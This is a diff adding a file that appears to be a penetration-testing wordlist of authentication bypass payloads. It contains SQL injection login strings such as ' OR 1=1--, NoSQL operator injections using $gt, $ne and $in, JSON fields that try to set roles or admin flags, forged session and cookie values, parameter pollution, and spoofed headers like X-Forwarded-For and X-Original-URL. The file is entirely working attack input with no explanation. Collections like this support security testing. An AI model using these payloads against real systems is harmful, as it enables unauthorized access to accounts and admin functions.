@@ -1,0 +1,47 @@
+# Authentication Bypass Payloads
+
+# SQL injection authentication bypass
+admin' --
+admin' #
+admin'/*
+' OR '1'='1' --
+' OR 1=1--
+admin' OR '1'='1
+') OR ('1'='1
+' OR 'x'='x
+admin') OR ('1'='1'--
+
+# NoSQL authentication bypass
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "administrator"]}, "password": {"$gt": ""}}
+
+# JSON payload manipulation
+{"username":"admin","password":"admin","role":"admin"}
+{"username":"admin","password":"wrong","isAdmin":true}
+{"username":"admin","is_authenticated":true}
+
+# Session manipulation
+PHPSESSID=admin
+session_id=00000000-0000-0000-0000-000000000001
+token=admin_token
+auth=true
+
+# Parameter pollution
+username=attacker&username=admin
+user=normal&user=admin
+
+# Cookie manipulation
+admin=true
+isAdmin=1
+role=admin
+authenticated=true
+user_level=admin
+
+# Header injection
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Originating-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
